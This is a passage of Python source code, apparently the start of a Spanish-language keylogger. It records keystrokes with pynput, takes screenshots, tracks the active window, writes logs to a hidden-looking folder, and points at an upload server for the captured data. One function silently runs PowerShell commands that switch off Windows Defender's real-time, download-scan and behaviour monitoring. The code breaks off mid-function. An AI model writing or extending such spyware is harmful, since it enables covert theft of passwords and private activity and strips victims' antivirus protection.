import subprocess
import requests
import threading
import time
from pynput.keyboard import Listener
from datetime import datetime
import pygetwindow as gw
import logging
import os
from PIL import ImageGrab

CARPETA_LOG = "C:\\BuildWork"
ARCHIVO_LOG = os.path.join(CARPETA_LOG, "keylog.txt")
CARPETA_SCREENSHOTS = os.path.join(CARPETA_LOG, "screenshots")
SERVER_URL = "http://127.0.0.1:5000/upload"

os.makedirs(CARPETA_SCREENSHOTS, exist_ok=True)

logging.basicConfig(
    filename=ARCHIVO_LOG,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

buffer_teclas = ""

def intentar_desactivar_defender():
    try:
        subprocess.run(
            ["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["powershell", "-Command", "Set-MpPreference -DisableIOAVProtection $true"],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true"],
            capture_output=True, timeout=10
        )
    except Exception:
        pass

def get_active_window():
    try:
        win = gw.getActiveWindow()
       